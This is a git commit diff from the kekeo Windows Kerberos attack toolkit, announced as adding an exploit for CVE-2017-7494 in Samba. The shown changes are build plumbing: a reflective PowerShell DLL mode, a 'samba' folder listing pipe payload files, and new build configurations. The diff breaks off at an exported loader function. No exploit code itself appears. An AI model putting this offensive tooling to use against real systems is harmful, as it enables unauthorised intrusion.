gentilkiwi__kekeo
commit df1b221daa0f9f9f9937322ffab77a1521d7246c
Author:     Benjamin DELPY <benjamin@gentilkiwi.com>
AuthorDate: Sun Jun 4 00:08:45 2017 +0200
Commit:     Benjamin DELPY <benjamin@gentilkiwi.com>
CommitDate: Sun Jun 4 00:08:45 2017 +0200

    exploit module for CVE-2017-7494, with registered pipe inside!

diff --git a/inc/globals.h b/inc/globals.h
index d380508..23da488 100644
--- a/inc/globals.h
+++ b/inc/globals.h
@@ -1,58 +1,63 @@
-/*	Benjamin DELPY `gentilkiwi`
-	http://blog.gentilkiwi.com
-	benjamin@gentilkiwi.com
-	Licence : https://creativecommons.org/licenses/by/4.0/
-*/
-#pragma once
-#include <ntstatus.h>
-#define WIN32_NO_STATUS
-#include <winsock2.h>
-#include <Ws2tcpip.h>
-#include <windows.h>
-#include <stdio.h>
-#include <sddl.h>
-#include <ntsecapi.h>
-#include <wchar.h>
-#include "../modules/kull_m_output.h"
-#ifdef _M_X64
-	#define MIMIKATZ_ARCH L"x64"
-#else ifdef _M_IX86
-	#define MIMIKATZ_ARCH L"x86"
-#endif
-
-#define MIMIKATZ				L"kekeo"
-#define MIMIKATZ_VERSION		L"2.0"
-#define MIMIKATZ_CODENAME		L"A La Vie, A L\'Amour"
-#define MIMIKATZ_FULL			MIMIKATZ L" " MIMIKATZ_VERSION L" (" MIMIKATZ_ARCH L") built on " TEXT(__DATE__) L" " TEXT(__TIME__)
-#define MIMIKATZ_SECOND			L"\"" MIMIKATZ_CODENAME L"\""
-#define MIMIKATZ_SPECIAL		L"                                "
-#define MIMIKATZ_DEFAULT_LOG	MIMIKATZ L".log"
-#define MIMIKATZ_KERBEROS_EXT	L"kirbi"
-#define MIMIKATZ_NONCE			1853451123
-
-#define MIMIKATZ_AUTO_COMMAND_START		1
-#define MIMIKATZ_AUTO_COMMAND_STRING	L"commandline"
-
-#ifndef NT_SUCCESS
-#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
-#endif
-
-#ifndef PRINT_ERROR
-#define PRINT_ERROR(...) (kprintf(L"ERROR " TEXT(__FUNCTION__) L" ; " __VA_ARGS__))
-#endif
-
-#ifndef PRINT_ERROR_AUTO
-#define PRINT_ERROR_AUTO(func) (kprintf(L"ERROR " TEXT(__FUNCTION__) L" ; " func L" (0x%08x)\n", GetLastError()))
-#endif
-
-#ifndef W00T
-#define W00T(...) (kprintf(TEXT(__FUNCTION__) L" w00t! ; " __VA_ARGS__))
-#endif
-
-DWORD MIMIKATZ_NT_MAJOR_VERSION, MIMIKATZ_NT_MINOR_VERSION, MIMIKATZ_NT_BUILD_NUMBER;
-BOOL g_isBreak;
-
-#define SIZE_ALIGN(size, alignment)	(size + ((size % alignment) ? (alignment - (size % alignment)) : 0))
-#define KIWI_NEVERTIME(filetime)	(*(PLONGLONG) filetime = MAXLONGLONG)
-
+/*	Benjamin DELPY `gentilkiwi`
+	http://blog.gentilkiwi.com
+	benjamin@gentilkiwi.com
+	Licence : https://creativecommons.org/licenses/by/4.0/
+*/
+#pragma once
+#include <ntstatus.h>
+#define WIN32_NO_STATUS
+#include <winsock2.h>
+#include <Ws2tcpip.h>
+#include <windows.h>
+#include <stdio.h>
+#include <sddl.h>
+#include <ntsecapi.h>
+#include <wchar.h>
+#include "../modules/kull_m_output.h"
+#ifdef _M_X64
+	#define MIMIKATZ_ARCH L"x64"
+#else ifdef _M_IX86
+	#define MIMIKATZ_ARCH L"x86"
+#endif
+
+#define MIMIKATZ				L"kekeo"
+#define MIMIKATZ_VERSION		L"2.0"
+#define MIMIKATZ_CODENAME		L"A La Vie, A L\'Amour"
+#define MIMIKATZ_FULL			MIMIKATZ L" " MIMIKATZ_VERSION L" (" MIMIKATZ_ARCH L") built on " TEXT(__DATE__) L" " TEXT(__TIME__)
+#define MIMIKATZ_SECOND			L"\"" MIMIKATZ_CODENAME L"\""
+#define MIMIKATZ_SPECIAL		L"                                "
+#define MIMIKATZ_DEFAULT_LOG	MIMIKATZ L".log"
+#define MIMIKATZ_KERBEROS_EXT	L"kirbi"
+#define MIMIKATZ_NONCE			1853451123
+
+#ifdef _WINDLL
+	#define MIMIKATZ_AUTO_COMMAND_START		0
+	#define MIMIKATZ_AUTO_COMMAND_STRING	L"powershell"
+#else
+	#define MIMIKATZ_AUTO_COMMAND_START		1
+	#define MIMIKATZ_AUTO_COMMAND_STRING	L"commandline"
+#endif
+
+#ifndef NT_SUCCESS
+#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
+#endif
+
+#ifndef PRINT_ERROR
+#define PRINT_ERROR(...) (kprintf(L"ERROR " TEXT(__FUNCTION__) L" ; " __VA_ARGS__))
+#endif
+
+#ifndef PRINT_ERROR_AUTO
+#define PRINT_ERROR_AUTO(func) (kprintf(L"ERROR " TEXT(__FUNCTION__) L" ; " func L" (0x%08x)\n", GetLastError()))
+#endif
+
+#ifndef W00T
+#define W00T(...) (kprintf(TEXT(__FUNCTION__) L" w00t! ; " __VA_ARGS__))
+#endif
+
+DWORD MIMIKATZ_NT_MAJOR_VERSION, MIMIKATZ_NT_MINOR_VERSION, MIMIKATZ_NT_BUILD_NUMBER;
+BOOL g_isBreak;
+
+#define SIZE_ALIGN(size, alignment)	(size + ((size % alignment) ? (alignment - (size % alignment)) : 0))
+#define KIWI_NEVERTIME(filetime)	(*(PLONGLONG) filetime = MAXLONGLONG)
+
 #define LM_NTLM_HASH_LENGTH	16
\ No newline at end of file
diff --git a/kekeo.sln b/kekeo.sln
index 1619c6a..f6cffc4 100644
--- a/kekeo.sln
+++ b/kekeo.sln
@@ -1,73 +1,87 @@
-﻿
-Microsoft Visual Studio Solution File, Format Version 11.00
-# Visual Studio 2010
-Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "kekeo", "kekeo\kekeo.vcxproj", "{E6F0D274-D280-4E1D-B11A-D47D63DDDE8E}"
-EndProject
-Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "global files", "global files", "{7BC63A9D-AA3E-471E-9AF2-90815A59FDF7}"
-	ProjectSection(SolutionItems) = preProject
-		README.md = README.md
-	EndProjectSection
-EndProject
-Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "inc", "inc", "{F673A1F0-9FBD-4E83-AF6C-9A8DA991BD88}"
-	ProjectSection(SolutionItems) = preProject
-		inc\DsGetDC.h = inc\DsGetDC.h
-		inc\globals.h = inc\globals.h
-		inc\Midles.h = inc\Midles.h
-		inc\NtDsAPI.h = inc\NtDsAPI.h
-		inc\ossasn1.h = inc\ossasn1.h
-		inc\osstype.h = inc\osstype.h
-		inc\schannel.h = inc\schannel.h
-		inc\Schedule.h = inc\Schedule.h
-		inc\schnlsp.h = inc\schnlsp.h
-		inc\WinBer.h = inc\WinBer.h
-		inc\WinDNS.h = inc\WinDNS.h
-		inc\Winldap.h = inc\Winldap.h
-	EndProjectSection
-EndProject
-Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "lib", "lib", "{D5AEF78D-1BB0-4D7B-A434-51BEA236AC15}"
-EndProject
-Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "Win32", "Win32", "{2D5BE43F-2697-4AFF-8D7A-9E2721C3A135}"
-	ProjectSection(SolutionItems) = preProject
-		lib\Win32\advapi32.hash.lib = lib\Win32\advapi32.hash.lib
-		lib\Win32\cryptdll.lib = lib\Win32\cryptdll.lib
-		lib\Win32\ntdll.min.lib = lib\Win32\ntdll.min.lib
-		lib\Win32\ossiphlp.lib = lib\Win32\ossiphlp.lib
-		lib\Win32\samlib.lib = lib\Win32\samlib.lib
-		lib\Win32\soeddefa.lib = lib\Win32\soeddefa.lib
-	EndProjectSection
-EndProject
-Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "x64", "x64", "{71D007E1-9E34-49BC-91C3-65CC186A9A52}"
-	ProjectSection(SolutionItems) = preProject
-		lib\x64\advapi32.hash.lib = lib\x64\advapi32.hash.lib
-		lib\x64\cryptdll.lib = lib\x64\cryptdll.lib
-		lib\x64\ntdll.min.lib = lib\x64\ntdll.min.lib
-		lib\x64\ossiphlp.lib = lib\x64\ossiphlp.lib
-		lib\x64\samlib.lib = lib\x64\samlib.lib
-		lib\x64\soeddefa.lib = lib\x64\soeddefa.lib
-	EndProjectSection
-EndProject
-Global
-	GlobalSection(SubversionScc) = preSolution
-		Svn-Managed = True
-		Manager = AnkhSVN - Subversion Support for Visual Studio
-	EndGlobalSection
-	GlobalSection(SolutionConfigurationPlatforms) = preSolution
-		Release|Win32 = Release|Win32
-		Release|x64 = Release|x64
-	EndGlobalSection
-	GlobalSection(ProjectConfigurationPlatforms) = postSolution
-		{E6F0D274-D280-4E1D-B11A-D47D63DDDE8E}.Release|Win32.ActiveCfg = Release|Win32
-		{E6F0D274-D280-4E1D-B11A-D47D63DDDE8E}.Release|Win32.Build.0 = Release|Win32
-		{E6F0D274-D280-4E1D-B11A-D47D63DDDE8E}.Release|x64.ActiveCfg = Release|x64
-		{E6F0D274-D280-4E1D-B11A-D47D63DDDE8E}.Release|x64.Build.0 = Release|x64
-	EndGlobalSection
-	GlobalSection(SolutionProperties) = preSolution
-		HideSolutionNode = FALSE
-	EndGlobalSection
-	GlobalSection(NestedProjects) = preSolution
-		{F673A1F0-9FBD-4E83-AF6C-9A8DA991BD88} = {7BC63A9D-AA3E-471E-9AF2-90815A59FDF7}
-		{D5AEF78D-1BB0-4D7B-A434-51BEA236AC15} = {7BC63A9D-AA3E-471E-9AF2-90815A59FDF7}
-		{2D5BE43F-2697-4AFF-8D7A-9E2721C3A135} = {D5AEF78D-1BB0-4D7B-A434-51BEA236AC15}
-		{71D007E1-9E34-49BC-91C3-65CC186A9A52} = {D5AEF78D-1BB0-4D7B-A434-51BEA236AC15}
-	EndGlobalSection
-EndGlobal
+﻿
+Microsoft Visual Studio Solution File, Format Version 11.00
+# Visual Studio 2010
+Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "kekeo", "kekeo\kekeo.vcxproj", "{E6F0D274-D280-4E1D-B11A-D47D63DDDE8E}"
+EndProject
+Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "global files", "global files", "{7BC63A9D-AA3E-471E-9AF2-90815A59FDF7}"
+	ProjectSection(SolutionItems) = preProject
+		README.md = README.md
+	EndProjectSection
+EndProject
+Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "inc", "inc", "{F673A1F0-9FBD-4E83-AF6C-9A8DA991BD88}"
+	ProjectSection(SolutionItems) = preProject
+		inc\DsGetDC.h = inc\DsGetDC.h
+		inc\globals.h = inc\globals.h
+		inc\Midles.h = inc\Midles.h
+		inc\NtDsAPI.h = inc\NtDsAPI.h
+		inc\ossasn1.h = inc\ossasn1.h
+		inc\osstype.h = inc\osstype.h
+		inc\schannel.h = inc\schannel.h
+		inc\Schedule.h = inc\Schedule.h
+		inc\schnlsp.h = inc\schnlsp.h
+		inc\WinBer.h = inc\WinBer.h
+		inc\WinDNS.h = inc\WinDNS.h
+		inc\Winldap.h = inc\Winldap.h
+	EndProjectSection
+EndProject
+Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "lib", "lib", "{D5AEF78D-1BB0-4D7B-A434-51BEA236AC15}"
+EndProject
+Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "Win32", "Win32", "{2D5BE43F-2697-4AFF-8D7A-9E2721C3A135}"
+	ProjectSection(SolutionItems) = preProject
+		lib\Win32\advapi32.hash.lib = lib\Win32\advapi32.hash.lib
+		lib\Win32\cryptdll.lib = lib\Win32\cryptdll.lib
+		lib\Win32\ntdll.min.lib = lib\Win32\ntdll.min.lib
+		lib\Win32\ossiphlp.lib = lib\Win32\ossiphlp.lib
+		lib\Win32\samlib.lib = lib\Win32\samlib.lib
+		lib\Win32\soeddefa.lib = lib\Win32\soeddefa.lib
+	EndProjectSection
+EndProject
+Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "x64", "x64", "{71D007E1-9E34-49BC-91C3-65CC186A9A52}"
+	ProjectSection(SolutionItems) = preProject
+		lib\x64\advapi32.hash.lib = lib\x64\advapi32.hash.lib
+		lib\x64\cryptdll.lib = lib\x64\cryptdll.lib
+		lib\x64\ntdll.min.lib = lib\x64\ntdll.min.lib
+		lib\x64\ossiphlp.lib = lib\x64\ossiphlp.lib
+		lib\x64\samlib.lib = lib\x64\samlib.lib
+		lib\x64\soeddefa.lib = lib\x64\soeddefa.lib
+	EndProjectSection
+EndProject
+Project("{2150E333-8FDC-42A3-9474-1A3956D46DE8}") = "samba", "samba", "{8B68E870-E7A4-446D-9853-3E1042FFD15A}"
+	ProjectSection(SolutionItems) = preProject
+		samba\lib_smb_pipe.c = samba\lib_smb_pipe.c
+		samba\lib_smb_pipe_x64.so = samba\lib_smb_pipe_x64.so
+		samba\lib_smb_pipe_x86.so = samba\lib_smb_pipe_x86.so
+	EndProjectSection
+EndProject
+Global
+	GlobalSection(SubversionScc) = preSolution
+		Svn-Managed = True
+		Manager = AnkhSVN - Subversion Support for Visual Studio
+	EndGlobalSection
+	GlobalSection(SolutionConfigurationPlatforms) = preSolution
+		Release|Win32 = Release|Win32
+		Release|x64 = Release|x64
+		Second_Release_PowerShell|Win32 = Second_Release_PowerShell|Win32
+		Second_Release_PowerShell|x64 = Second_Release_PowerShell|x64
+	EndGlobalSection
+	GlobalSection(ProjectConfigurationPlatforms) = postSolution
+		{E6F0D274-D280-4E1D-B11A-D47D63DDDE8E}.Release|Win32.ActiveCfg = Release|Win32
+		{E6F0D274-D280-4E1D-B11A-D47D63DDDE8E}.Release|Win32.Build.0 = Release|Win32
+		{E6F0D274-D280-4E1D-B11A-D47D63DDDE8E}.Release|x64.ActiveCfg = Release|x64
+		{E6F0D274-D280-4E1D-B11A-D47D63DDDE8E}.Release|x64.Build.0 = Release|x64
+		{E6F0D274-D280-4E1D-B11A-D47D63DDDE8E}.Second_Release_PowerShell|Win32.ActiveCfg = Second_Release_PowerShell|Win32
+		{E6F0D274-D280-4E1D-B11A-D47D63DDDE8E}.Second_Release_PowerShell|Win32.Build.0 = Second_Release_PowerShell|Win32
+		{E6F0D274-D280-4E1D-B11A-D47D63DDDE8E}.Second_Release_PowerShell|x64.ActiveCfg = Second_Release_PowerShell|x64
+		{E6F0D274-D280-4E1D-B11A-D47D63DDDE8E}.Second_Release_PowerShell|x64.Build.0 = Second_Release_PowerShell|x64
+	EndGlobalSection
+	GlobalSection(SolutionProperties) = preSolution
+		HideSolutionNode = FALSE
+	EndGlobalSection
+	GlobalSection(NestedProjects) = preSolution
+		{F673A1F0-9FBD-4E83-AF6C-9A8DA991BD88} = {7BC63A9D-AA3E-471E-9AF2-90815A59FDF7}
+		{D5AEF78D-1BB0-4D7B-A434-51BEA236AC15} = {7BC63A9D-AA3E-471E-9AF2-90815A59FDF7}
+		{8B68E870-E7A4-446D-9853-3E1042FFD15A} = {7BC63A9D-AA3E-471E-9AF2-90815A59FDF7}
+		{2D5BE43F-2697-4AFF-8D7A-9E2721C3A135} = {D5AEF78D-1BB0-4D7B-A434-51BEA236AC15}
+		{71D007E1-9E34-49BC-91C3-65CC186A9A52} = {D5AEF78D-1BB0-4D7B-A434-51BEA236AC15}
+	EndGlobalSection
+EndGlobal
diff --git a/kekeo/kekeo.c b/kekeo/kekeo.c
index fe36e78..ef5028e 100644
--- a/kekeo/kekeo.c
+++ b/kekeo/kekeo.c
@@ -1,192 +1,216 @@
-/*	Benjamin DELPY `gentilkiwi`
-	http://blog.gentilkiwi.com
-	benjamin@gentilkiwi.com
-	Licence : https://creativecommons.org/licenses/by/4.0/
-*/
-#include "kekeo.h"
-
-const KUHL_M * mimikatz_modules[] = {
-	&kuhl_m_standard,
-	&kuhl_m_tgt,
-	&kuhl_m_tgs,
-	&kuhl_m_exploit,
-	&kuhl_m_misc,
-	&kuhl_m_kerberos,
-	&kuhl_m_smb,
-};
-
-int wmain(int argc, wchar_t * argv[])
-{
-	NTSTATUS status = STATUS_SUCCESS;
-	int i;
-	size_t len;
-	wchar_t input[0xffff];
-	kull_m_output_init();
-	SetConsoleTitle(MIMIKATZ L" " MIMIKATZ_VERSION L" " MIMIKATZ_ARCH L" (oe.eo)");
-	SetConsoleCtrlHandler(HandlerRoutine, TRUE);
-
-
-	kprintf(L"\n"
-		L"  ___ _    " MIMIKATZ_FULL L"\n"
-		L" /   ('>-  " MIMIKATZ_SECOND L"\n"
-		L" | K  |    /* * *\n"
-		L" \\____/     Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n"
-		L"  L\\_       http://blog.gentilkiwi.com/kekeo                (oe.eo)\n"
-		L"            " MIMIKATZ_SPECIAL L" with %2u modules * * */\n", ARRAYSIZE(mimikatz_modules));
-
-	mimikatz_initOrClean(TRUE);
-	for(i = MIMIKATZ_AUTO_COMMAND_START ; (i < argc) && (status != STATUS_FATAL_APP_EXIT) ; i++)
-	{
-		kprintf(L"\n" MIMIKATZ L"(" MIMIKATZ_AUTO_COMMAND_STRING L") # %s\n", argv[i]);
-		status = mimikatz_dispatchCommand(argv[i]);
-	}
-	while (status != STATUS_FATAL_APP_EXIT)
-	{
-		kprintf(L"\n" MIMIKATZ L" # "); fflush(stdin);
-		if(fgetws(input, ARRAYSIZE(input), stdin) && (len = wcslen(input)) && (input[0] != L'\n'))
-		{
-			if(input[len - 1] == L'\n')
-				input[len - 1] = L'\0';
-			kprintf_inputline(L"%s\n", input);
-			status = mimikatz_dispatchCommand(input);
-		}
-	}
-	mimikatz_initOrClean(FALSE);
-	SetConsoleCtrlHandler(HandlerRoutine, FALSE);
-	kull_m_output_clean();
-	return STATUS_SUCCESS;
-}
-
-BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
-{
-	mimikatz_initOrClean(FALSE);
-	return FALSE;
-}
-
-NTSTATUS mimikatz_initOrClean(BOOL Init)
-{
-	unsigned short indexModule;
-	PKUHL_M_C_FUNC_INIT function;
-	long offsetToFunc;
-	NTSTATUS fStatus;
-	HRESULT hr;
-
-	g_isBreak = !Init;
-	if(Init)
-	{
-		RtlGetNtVersionNumbers(&MIMIKATZ_NT_MAJOR_VERSION, &MIMIKATZ_NT_MINOR_VERSION, &MIMIKATZ_NT_BUILD_NUMBER);
-		MIMIKATZ_NT_BUILD_NUMBER &= 0x00003fff;
-		offsetToFunc = FIELD_OFFSET(KUHL_M, pInit);
-		hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
-		if(FAILED(hr))
-			PRINT_ERROR(L"CoInitializeEx: %08x\n", hr);
-		kull_m_sock_startup();
-		kull_m_kerberos_asn1_init();
-	}
-	else
-		offsetToFunc = FIELD_OFFSET(KUHL_M, pClean);
-
-	for(indexModule = 0; indexModule < ARRAYSIZE(mimikatz_modules); indexModule++)
-	{
-		if(function = *(PKUHL_M_C_FUNC_INIT *) ((ULONG_PTR) (mimikatz_modules[indexModule]) + offsetToFunc))
-		{
-			fStatus = function();
-			if(!NT_SUCCESS(fStatus))
-				kprintf(L">>> %s of \'%s\' module failed : %08x\n", (Init ? L"INIT" : L"CLEAN"), mimikatz_modules[indexModule]->shortName, fStatus);
-		}
-	}
-
-	if(!Init)
-	{
-		CoUninitialize();
-		kull_m_kerberos_asn1_term();
-		kull_m_sock_finish();
-		kull_m_output_file(NULL);
-	}
-	return STATUS_SUCCESS;
-}
-
-NTSTATUS mimikatz_dispatchCommand(wchar_t * input)
-{
-	NTSTATUS status;
-	PWCHAR full;
-	if(full = kull_m_file_fullPath(input))
-	{
-		switch(full[0])
-		{
-		default:
-			status = mimikatz_doLocal(full);
-		}
-		LocalFree(full);
-	}
-	return status;
-}
-
-NTSTATUS mimikatz_doLocal(wchar_t * input)
-{
-	NTSTATUS status = STATUS_SUCCESS;
-	int argc;
-	wchar_t ** argv = CommandLineToArgvW(input, &argc), *module = NULL, *command = NULL, *match;
-	unsigned short indexModule, indexCommand;
-	BOOL moduleFound = FALSE, commandFound = FALSE;
-	
-	if(argv && (argc > 0))
-	{
-		if(match = wcsstr(argv[0], L"::"))
-		{
-			if(module = (wchar_t *) LocalAlloc(LPTR, (match - argv[0] + 1) * sizeof(wchar_t)))
-			{
-				if((unsigned int) (match + 2 - argv[0]) < wcslen(argv[0]))
-					command = match + 2;
-				RtlCopyMemory(module, argv[0], (match - argv[0]) * sizeof(wchar_t));
-			}
-		}
-		else command = argv[0];
-
-		for(indexModule = 0; !moduleFound && (indexModule < ARRAYSIZE(mimikatz_modules)); indexModule++)
-			if(moduleFound = (!module || (_wcsicmp(module, mimikatz_modules[indexModule]->shortName) == 0)))
-				if(command)
-					for(indexCommand = 0; !commandFound && (indexCommand < mimikatz_modules[indexModule]->nbCommands); indexCommand++)
-						if(commandFound = _wcsicmp(command, mimikatz_modules[indexModule]->commands[indexCommand].command) == 0)
-							status = mimikatz_modules[indexModule]->commands[indexCommand].pCommand(argc - 1, argv + 1);
-
-		if(!moduleFound)
-		{
-			PRINT_ERROR(L"\"%s\" module not found !\n", module);
-			for(indexModule = 0; indexModule < ARRAYSIZE(mimikatz_modules); indexModule++)
-			{
-				kprintf(L"\n%16s", mimikatz_modules[indexModule]->shortName);
-				if(mimikatz_modules[indexModule]->fullName)
-					kprintf(L"  -  %s", mimikatz_modules[indexModule]->fullName);
-				if(mimikatz_modules[indexModule]->description)
-					kprintf(L"  [%s]", mimikatz_modules[indexModule]->description);
-			}
-			kprintf(L"\n");
-		}
-		else if(!commandFound)
-		{
-			indexModule -= 1;
-			PRINT_ERROR(L"\"%s\" command of \"%s\" module not found !\n", command, mimikatz_modules[indexModule]->shortName);
-
-			kprintf(L"\nModule :\t%s", mimikatz_modules[indexModule]->shortName);
-			if(mimikatz_modules[indexModule]->fullName)
-				kprintf(L"\nFull name :\t%s", mimikatz_modules[indexModule]->fullName);
-			if(mimikatz_modules[indexModule]->description)
-				kprintf(L"\nDescription :\t%s", mimikatz_modules[indexModule]->description);
-			kprintf(L"\n");
-
-			for(indexCommand = 0; indexCommand < mimikatz_modules[indexModule]->nbCommands; indexCommand++)
-			{
-				kprintf(L"\n%16s", mimikatz_modules[indexModule]->commands[indexCommand].command);
-				if(mimikatz_modules[indexModule]->commands[indexCommand].description)
-					kprintf(L"  -  %s", mimikatz_modules[indexModule]->commands[indexCommand].description);
-			}
-			kprintf(L"\n");
-		}
-
-		if(module)
-			LocalFree(module);
-		LocalFree(argv);
-	}
-	return status;
-}
\ No newline at end of file
+/*	Benjamin DELPY `gentilkiwi`
+	http://blog.gentilkiwi.com
+	benjamin@gentilkiwi.com
+	Licence : https://creativecommons.org/licenses/by/4.0/
+*/
+#include "kekeo.h"
+
+const KUHL_M * mimikatz_modules[] = {
+	&kuhl_m_standard,
+	&kuhl_m_tgt,
+	&kuhl_m_tgs,
+	&kuhl_m_exploit,
+	&kuhl_m_misc,
+	&kuhl_m_kerberos,
+	&kuhl_m_smb,
+};
+
+int wmain(int argc, wchar_t * argv[])
+{
+	NTSTATUS status = STATUS_SUCCESS;
+	int i;
+#ifndef _WINDLL
+	size_t len;
+	wchar_t input[0xffff];
+	kull_m_output_init();
+	SetConsoleTitle(MIMIKATZ L" " MIMIKATZ_VERSION L" " MIMIKATZ_ARCH L" (oe.eo)");
+	SetConsoleCtrlHandler(HandlerRoutine, TRUE);
+#endif
+	kprintf(L"\n"
+		L"  ___ _    " MIMIKATZ_FULL L"\n"
+		L" /   ('>-  " MIMIKATZ_SECOND L"\n"
+		L" | K  |    /* * *\n"
+		L" \\____/     Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n"
+		L"  L\\_       http://blog.gentilkiwi.com/kekeo                (oe.eo)\n"
+		L"            " MIMIKATZ_SPECIAL L" with %2u modules * * */\n", ARRAYSIZE(mimikatz_modules));
+
+	mimikatz_initOrClean(TRUE);
+	for(i = MIMIKATZ_AUTO_COMMAND_START ; (i < argc) && (status != STATUS_FATAL_APP_EXIT) ; i++)
+	{
+		kprintf(L"\n" MIMIKATZ L"(" MIMIKATZ_AUTO_COMMAND_STRING L") # %s\n", argv[i]);
+		status = mimikatz_dispatchCommand(argv[i]);
+	}
+#ifndef _WINDLL
+	while (status != STATUS_FATAL_APP_EXIT)
+	{
+		kprintf(L"\n" MIMIKATZ L" # "); fflush(stdin);
+		if(fgetws(input, ARRAYSIZE(input), stdin) && (len = wcslen(input)) && (input[0] != L'\n'))
+		{
+			if(input[len - 1] == L'\n')
+				input[len - 1] = L'\0';
+			kprintf_inputline(L"%s\n", input);
+			status = mimikatz_dispatchCommand(input);
+		}
+	}
+#endif
+	mimikatz_initOrClean(FALSE);
+#ifndef _WINDLL
+	SetConsoleCtrlHandler(HandlerRoutine, FALSE);
+	kull_m_output_clean();
+#endif
+	return STATUS_SUCCESS;
+}
+
+BOOL WINAPI HandlerRoutine(DWORD dwCtrlType)
+{
+	mimikatz_initOrClean(FALSE);
+	return FALSE;
+}
+
+NTSTATUS mimikatz_initOrClean(BOOL Init)
+{
+	unsigned short indexModule;
+	PKUHL_M_C_FUNC_INIT function;
+	long offsetToFunc;
+	NTSTATUS fStatus;
+	HRESULT hr;
+	g_isBreak = !Init;
+	if(Init)
+	{
+		RtlGetNtVersionNumbers(&MIMIKATZ_NT_MAJOR_VERSION, &MIMIKATZ_NT_MINOR_VERSION, &MIMIKATZ_NT_BUILD_NUMBER);
+		MIMIKATZ_NT_BUILD_NUMBER &= 0x00003fff;
+		offsetToFunc = FIELD_OFFSET(KUHL_M, pInit);
+		hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
+		if(FAILED(hr))
+#ifdef _WINDLL
+			if(hr != RPC_E_CHANGED_MODE)
+#endif
+			PRINT_ERROR(L"CoInitializeEx: %08x\n", hr);
+		kull_m_sock_startup();
+		kull_m_kerberos_asn1_init();
+	}
+	else
+		offsetToFunc = FIELD_OFFSET(KUHL_M, pClean);
+
+	for(indexModule = 0; indexModule < ARRAYSIZE(mimikatz_modules); indexModule++)
+	{
+		if(function = *(PKUHL_M_C_FUNC_INIT *) ((ULONG_PTR) (mimikatz_modules[indexModule]) + offsetToFunc))
+		{
+			fStatus = function();
+			if(!NT_SUCCESS(fStatus))
+				kprintf(L">>> %s of \'%s\' module failed : %08x\n", (Init ? L"INIT" : L"CLEAN"), mimikatz_modules[indexModule]->shortName, fStatus);
+		}
+	}
+
+	if(!Init)
+	{
+		kull_m_kerberos_asn1_term();
+		CoUninitialize();
+		kull_m_sock_finish();
+		kull_m_output_file(NULL);
+	}
+	return STATUS_SUCCESS;
+}
+
+NTSTATUS mimikatz_dispatchCommand(wchar_t * input)
+{
+	NTSTATUS status;
+	PWCHAR full;
+	if(full = kull_m_file_fullPath(input))
+	{
+		switch(full[0])
+		{
+		default:
+			status = mimikatz_doLocal(full);
+		}
+		LocalFree(full);
+	}
+	return status;
+}
+
+NTSTATUS mimikatz_doLocal(wchar_t * input)
+{
+	NTSTATUS status = STATUS_SUCCESS;
+	int argc;
+	wchar_t ** argv = CommandLineToArgvW(input, &argc), *module = NULL, *command = NULL, *match;
+	unsigned short indexModule, indexCommand;
+	BOOL moduleFound = FALSE, commandFound = FALSE;
+	
+	if(argv && (argc > 0))
+	{
+		if(match = wcsstr(argv[0], L"::"))
+		{
+			if(module = (wchar_t *) LocalAlloc(LPTR, (match - argv[0] + 1) * sizeof(wchar_t)))
+			{
+				if((unsigned int) (match + 2 - argv[0]) < wcslen(argv[0]))
+					command = match + 2;
+				RtlCopyMemory(module, argv[0], (match - argv[0]) * sizeof(wchar_t));
+			}
+		}
+		else command = argv[0];
+
+		for(indexModule = 0; !moduleFound && (indexModule < ARRAYSIZE(mimikatz_modules)); indexModule++)
+			if(moduleFound = (!module || (_wcsicmp(module, mimikatz_modules[indexModule]->shortName) == 0)))
+				if(command)
+					for(indexCommand = 0; !commandFound && (indexCommand < mimikatz_modules[indexModule]->nbCommands); indexCommand++)
+						if(commandFound = _wcsicmp(command, mimikatz_modules[indexModule]->commands[indexCommand].command) == 0)
+							status = mimikatz_modules[indexModule]->commands[indexCommand].pCommand(argc - 1, argv + 1);
+
+		if(!moduleFound)
+		{
+			PRINT_ERROR(L"\"%s\" module not found !\n", module);
+			for(indexModule = 0; indexModule < ARRAYSIZE(mimikatz_modules); indexModule++)
+			{
+				kprintf(L"\n%16s", mimikatz_modules[indexModule]->shortName);
+				if(mimikatz_modules[indexModule]->fullName)
+					kprintf(L"  -  %s", mimikatz_modules[indexModule]->fullName);
+				if(mimikatz_modules[indexModule]->description)
+					kprintf(L"  [%s]", mimikatz_modules[indexModule]->description);
+			}
+			kprintf(L"\n");
+		}
+		else if(!commandFound)
+		{
+			indexModule -= 1;
+			PRINT_ERROR(L"\"%s\" command of \"%s\" module not found !\n", command, mimikatz_modules[indexModule]->shortName);
+
+			kprintf(L"\nModule :\t%s", mimikatz_modules[indexModule]->shortName);
+			if(mimikatz_modules[indexModule]->fullName)
+				kprintf(L"\nFull name :\t%s", mimikatz_modules[indexModule]->fullName);
+			if(mimikatz_modules[indexModule]->description)
+				kprintf(L"\nDescription :\t%s", mimikatz_modules[indexModule]->description);
+			kprintf(L"\n");
+
+			for(indexCommand = 0; indexCommand < mimikatz_modules[indexModule]->nbCommands; indexCommand++)
+			{
+				kprintf(L"\n%16s", mimikatz_modules[indexModule]->commands[indexCommand].command);
+				if(mimikatz_modules[indexModule]->commands[indexCommand].description)
+					kprintf(L"  -  %s", mimikatz_modules[indexModule]->commands[indexCommand].description);
+			}
+			kprintf(L"\n");
+		}
+
+		if(module)
+			LocalFree(module);
+		LocalFree(argv);
+	}
+	return status;
+}
+
+#ifdef _WINDLL
+__declspec(dllexport) wchar_t * powershell_reflective_kekeo(LPCWSTR input)
+{
